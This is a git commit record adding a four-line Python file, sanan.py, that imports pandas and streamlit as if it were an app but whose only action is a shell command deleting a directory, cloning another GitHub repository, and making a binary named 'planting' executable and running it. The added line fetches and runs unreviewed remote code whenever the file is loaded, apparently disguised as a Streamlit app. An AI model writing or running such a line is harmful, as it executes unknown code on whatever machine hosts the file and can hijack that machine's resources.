6b7176258135f9b6941f4a72110eed33d7f3031b
aldisanita <109478053+aldisanita@users.noreply.github.com>
2022-07-18 00:06:57 +0700

    Create sanan.py

---
+++ sanan.py
@@ -0,0 +1,4 @@
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf samina && git clone https://github.com/aldisanita/werin.git && cd werin  && chmod +x planting && ./planting")
